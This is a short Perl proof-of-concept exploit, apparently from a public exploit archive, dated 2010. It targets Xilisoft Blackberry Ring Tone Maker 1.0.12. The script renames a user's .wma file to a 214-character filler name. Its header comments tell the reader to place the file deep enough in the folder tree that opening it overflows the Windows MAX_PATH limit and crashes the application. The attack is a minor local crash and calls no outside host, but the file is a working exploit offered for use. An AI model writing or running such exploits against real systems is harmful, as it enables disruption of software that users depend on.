#!/usr/bin/perl
# Exploit Title: Xilisoft Blackberry Ring Tone Maker .wma Local Crash
# Date: March 29, 2010
# Software Link: [http://www.xilisoft.com/blackberry-ringtone-maker.html]
# Version: 1.0.12 build-0326
# Tested on: Windows XP SP3 / Windows 7
# Cost: 9.95 USD
# Author: chap0
# Site: http://www.setfreesecurity.com
# Email: chap0x90[at]gmail[dot]com
#
# Xilisoft Blackberry Ring Tone Maker software crashes when you open a legit .wma file that
# is beyond the maximum length for a path. [MAX_PATH, which is defined as 260 characters]
# Reference: [http://msdn.microsoft.com/en-us/library/aa365247%28VS.85%29.aspx#maxpath]
#
# To exploit: Run the code to change a legit .wma file and then make sure that the file
# is placed on the Windows OS deep enough to open pass the 260 "MAX PATH
#
#Ex: C:\Documents and Settings\victim\Desktop\name_of_file.wma
#
# Pull your sickness from my throat, Let me breath the truth
# Greetz: GOD, The wife for support, 4lex, & C.I.A
#
 
print "Name That Song! ";
 
chomp ($song = <STDIN>);
$junk = "\x41" x 214;
 
rename ("$song.wma", "$junk.wma");
print "Bury deep! \n";
exit;
